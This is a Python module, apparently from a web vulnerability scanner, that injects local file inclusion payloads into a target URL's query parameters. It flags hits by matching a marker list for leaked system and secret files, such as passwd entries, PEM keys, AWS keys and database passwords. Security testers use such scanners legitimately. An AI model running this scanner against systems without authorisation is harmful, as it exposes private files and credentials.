"""lfi — LFI scanner with Probe (baseline, mutate, marker)"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.probe import Probe
from core.payloads import get

MARKERS = [
    "root:x:0:0", "daemon:x:", "bin:x:", "nobody:x:",
    "[fonts]", "[extensions]", "for 16-bit app support",
    "DOCUMENT_ROOT=", "HTTP_USER_AGENT=", "REMOTE_ADDR=",
    "-----BEGIN", "AWS_ACCESS_KEY_ID", "DB_PASSWORD",
    "localhost:3306", "127.0.0.1:6379",
]


class Lfi:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        params = parse_qs(u.query) or {"file": ["index"]}

        probe = Probe(session, logger)
        base = probe.baseline_probe(target)
        if not base:
            print("[lfi] no baseline")
            return {"findings": []}
        print(f"[lfi] baseline: {base['code']} {base['len']}b")

        # base payloads from file
        payloads = get("lfi", limit=200, mutate_by=0)
        print(f"[lfi] {len(payloads)} payloads on params {list(params.keys())}")

        findings = []

        for name in params:
            print(f"\n[lfi] param '{name}'")
            for i, p in enumerate(payloads, 1):
                url_fn = lambda pl, u=u, params=params, name=name: urlunparse(
                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()}, name: pl}, doseq=True))
                )
                r = probe.inject(url_fn, p, detect_markers=MARKERS)
                if r["hit"] and r["reason"].startswith("marker:"):
                    print(f"  ✓ {r['reason']} — {p[:60]}")
                    findings.append({
                        "param": name,
                        "payload": r["payload"],
                        "marker": r["reason"].split(":", 1)[1],
                    })
                    logger.finding("lfi", "critical", f"{name}={p[:60]} ({r['reason']})")
                elif i % 50 == 0:
                    print(f"  · {i}/{len(payloads)} done, {len(findings)} hits")

        stats = probe.summary()
        print(f"\n[lfi] total findings: {len(findings)}")
        print(f"[lfi] stats: req={stats['requests']} blocks={stats['blocks']}")

        return {"findings": findings, "stats": stats}
